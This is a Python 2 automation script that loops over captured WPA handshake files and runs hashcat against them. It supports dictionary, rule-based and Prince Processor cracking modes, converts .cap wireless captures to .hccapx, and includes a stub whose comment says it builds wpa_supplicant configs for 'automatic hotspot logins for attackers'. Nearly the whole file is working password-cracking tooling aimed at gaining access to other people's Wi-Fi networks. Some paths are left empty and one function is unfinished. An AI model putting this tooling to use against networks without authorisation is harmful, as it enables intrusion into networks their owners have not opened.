import os, operator, sys, subprocess, threading, time

# Path of your .hccapx file wordlist
hashdir = "C:\\Users\\Chang\\Desktop\\hashcat-4.2.1"

os.chdir(hashdir)
# Wordlist of .hccapx files one per line
hashlist = "C:\\Users\\Chang\\Desktop\\hashcat-4.2.1\\listofhccapx.txt"

# The dictionary of passwords we are trying
pwwordlist = "C:\\Users\\Chang\\Downloads\\WordList_Collection\\oCustom-WPA.txt"

# The downloaded hashcat binary
hcbinary = "C:\\Users\\Chang\\Desktop\\hashcat-4.2.1\\hashcat64.exe"

# Type of password attack, options are... STRAIGHT, RULESET, PRINCEPROCESSOR
pwAttackConfig = "STRAIGHT"

def determineHCCommand(pwAttackConfig, hashfile, pwwordlist, hcbinary):# Chooses between STRAIGHT, RULESET, and PRINCEPROCESSOR (limit 10 minute) attacks
    if pwAttackConfig == "STRAIGHT":
        cmd = "{} -a 0 -w 4 -m 2500 {} {}".format(
                str(hcbinary),
                str(hashfile),
                str(pwwordlist)
        )
        runHashCat2(cmd)

    if pwAttackConfig == "RULESET":
        ruleset = ""# Full path to ruleset file
        cmd = "{} -a 0 -w 4 -m 2500 {} {} -r {}".format(
                str(hcbinary),
                str(hashfile),
                str(pwwordlist),
                str(ruleset)
        )
        runHashCat2(cmd)
    if pwAttackConfig == "PRINCEPROCESSOR":
        ppbinary = "C:\\Users\\Chang\\Desktop\\hashcat-4.2.1\\princeprocessor-0.22\\pp64.exe"# full path to Prince Processor Binary
        # Only allow this to run for ten minutes, after that Prince Processor's effectiveness plateaus
        cmd = "{} < {} | hashcat -a 0 -w 4 -m 2500 {} --runtime 600".format(
                str(ppbinary),
                str(pwwordlist),
                str(hashfile)
        )
        runHashCat2(cmd)
    return cmd

def runHashCat2(cmd):
    print "DEBUG COMMAND = ", str(cmd)
    os.system(cmd)
    return
def convertCaptoHccapx():# Uses Hashcat Utils Cap2Hccapx.exe to generate crackable hccapx files from .cap wireless capture files
    cap2hccapxbin = ""
    capConvertList = ""
    r = open(capConvertList,'r')
    l = r.read()
    lines = l.splitlines()
    for line in lines:
        capFile = str(line).strip().rstrip()
        hccapxFile = capFile + ".hccapx"
        print "DEBUG: Converting = ", str(capFile)
        cmd = "{0} {1} {2}".format(
                str(cap2hccapxbin),
                str(capFile),
                str(hccapxFile)
        )
        hashlist = ""
        w = open(hashlist,'a+')
        w.write(hccapxFile)
        os.system(cmd)
    print "All done."
    return hashlist

def generateWPASupplicantConfig():# Generates a /etc/wpa_supplicant/wpa_supplicant.conf file for automatic hotspot logins for attackers. Requires the hashcat.potfile saved from cracked passwords.
    return
def readCrackList(hashlist):
    r = open(hashlist,'r')
    l = r.read()
    lines = l.splitlines()
    for line in lines:
        hashfile = str(line).strip().rstrip()
        print "DEBUG: Now cracking the hashes of file = ", str(hashfile)
        determineHCCommand(pwAttackConfig, hashfile, pwwordlist, hcbinary)
        # runHashCat(hashfile, pwwordlist, hcbinary)
    return

def runHashCat(hashfile, pwwordlist, hcbinary):
    cmd = "{} -a 0 -w 4 -m 2500 {} {}".format(
            str(hcbinary),
            str(hashfile),
            str(pwwordlist)
    ).strip().rstrip()
    print "DEBUG COMMAND = ", str(cmd)
    os.system(cmd)
    return

def main():
    readCrackList(hashlist)
    return
main()